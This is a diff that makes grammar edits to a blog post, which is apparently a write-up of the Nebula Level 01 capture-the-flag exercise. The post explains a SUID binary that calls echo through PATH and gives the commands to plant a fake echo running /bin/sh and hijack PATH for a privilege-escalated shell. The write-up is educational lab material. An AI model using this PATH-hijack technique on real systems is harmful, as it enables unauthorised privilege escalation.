@@ -90,7 +90,7 @@
       <div class="post">
   <h1 class="post-title">Nebula Level 01</h1>
   <span class="post-date">10 Dec 2014</span>
-  <p>I’ve been reading about security these months ago. I really enjoy learning each day but I think that sometimes is to much theory and I felt the necessity to start practice and gain more confidence about what I was reading. Please you do not misunderstand me, I think that theory plays a main role in security but in the process of learning the practice give you more sight about everything.</p>
+  <p>I’ve been reading about security these months ago. I really enjoy learning each day but I think that sometimes is to much theory and I feel the necessity to start practice and gain more confidence about what I was reading. Please you do not misunderstand me, I think that theory plays a main role in security but in the process of learning the practice give you more sight about everything.</p>
 
 <p>Yesterday I downloaded the first virtual machine from <a href="https://exploit-exercises.com">Exploit Exercises</a>. The second exercise show you the next snippet and it encourages you to try find out the vulnerability . </p>
 <div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include &lt;stdlib.h&gt;</span>
@@ -116,7 +116,7 @@
 <div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>find . -type f -perm +6000 -ls 2&gt; /dev/null
 <span class="m">12962</span>    <span class="m">8</span> -rwsr-x---   <span class="m">1</span> flag01   level01      <span class="m">7322</span> Nov <span class="m">20</span>  <span class="m">2011</span> ./flag01
 </code></pre></div>
-<p>It is a suid program. It Sets the Real, Effective and Saved UIDs the same as the Effective UID. This is so that the SUID process is now effectively running as if called by the owner <code>flag01</code>. The main issue with this snippet is when it calls <code>echo</code> without specifying the absolute path or using <code>/usr/bin/env</code> because otherwise it would have execute the built-in echo. But how it uses<code>/usr/bin/env</code> it will try to find the echo executable in the variable $PATH. However $PATH is controlled by us, so we could trick the program to use another malicious echo binary. It would be enough to do the next to get a shell.</p>
+<p>It is a suid program. It sets the Real, Effective and Saved UIDs the same as the Effective UID. This is so that the SUID process is now effectively running as if called by the owner <code>flag01</code>. The main issue with this snippet is when it calls <code>echo</code> without specifying the absolute path or using <code>/usr/bin/env</code> because otherwise it would have execute the built-in echo. But how it uses<code>/usr/bin/env</code> it will try to find the echo executable in the variable $PATH. However $PATH is controlled by us, so we could trick the program to use another malicious echo binary. It would be enough to do the next to get a shell.</p>
 <div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;/bin/sh&#39;</span> &gt; /path/echo
 <span class="nv">$ </span>chmod +x /path/echo
 <span class="nv">$ PATH</span><span class="o">=</span>/path/:<span class="nv">$PATH</span>
